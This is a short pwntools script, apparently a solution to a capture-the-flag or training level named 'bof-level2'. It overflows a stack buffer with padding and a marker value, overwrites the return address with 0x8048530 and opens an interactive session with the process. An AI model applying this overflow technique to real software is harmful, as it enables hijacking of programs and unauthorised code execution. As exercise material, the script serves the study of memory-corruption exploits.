#!/usr/bin/env python

from pwn import *

p = process('./bof-level2')

print(p.recv())

buffer = "A" * 20
buffer += "ABCDEFGH"
buffer += "A" * 8
buffer += p32(0x8048530)

p.sendline(buffer)

p.interactive()
